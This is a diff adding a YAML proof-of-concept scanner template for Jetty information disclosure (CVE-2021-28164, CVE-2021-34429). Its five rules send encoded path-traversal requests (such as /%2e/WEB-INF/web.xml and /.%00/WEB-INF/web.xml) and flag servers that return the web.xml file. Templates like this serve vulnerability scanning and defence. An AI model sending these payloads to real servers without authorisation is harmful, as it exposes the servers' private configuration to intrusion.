@@ -1,0 +1,64 @@
+name: poc-yaml-jetty-web.xml-info
+transport: http
+rules:
+  r1:
+    request:
+      method: GET
+      path: /%2e/WEB-INF/web.xml
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+      body: aaa
+    expression: |
+      response.status_code==200 && operator.contains(str(response.text),'<web-app>')
+    output: 
+      payload: /%2e/WEB-INF/web.xml
+  r2:
+    request:
+      method: GET
+      path: /.%00/WEB-INF/web.xml
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+    expression: |
+      response.status_code==200 && operator.contains(str(response.text),'<web-app>')
+    output: 
+      payload: /.%00/WEB-INF/web.xml
+  r3:
+    request:
+      method: GET
+      path: /%u002e/WEB-INF/web.xml
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+    expression: |
+      response.status_code==200 && operator.contains(response.text,'<web-app>')
+    output: 
+      payload: /%u002e/WEB-INF/web.xml
+  r4:
+    request:
+      method: GET
+      path: /static?/WEB-INF/web.xml
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+    expression: |
+      response.status_code==200 && operator.contains(str(response.text),'<web-app>')
+    output: 
+      payload: /static?/WEB-INF/web.xml
+  r5:
+    request:
+      method: GET
+      path: /a/b/..%00/WEB-INF/web.xml
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+    expression: |
+      response.status_code==200 && operator.contains(str(response.text),'<web-app>')
+    output: 
+      payload: "/a/b/..%00/WEB-INF/web.xml"
+output: $payload
+expression: r1() || r2() || r3() || r4() || r5()
+detail:
+  name: Jetty web.xml敏感信息泄露
+  author: qianxiao996
+  group: 敏感信息泄露
+  category: Jetty
+  vuln_id: CVE-2021-28164,CVE-2021-34429
+  description: 'jetty web.xml敏感信息泄露'
+  links: []
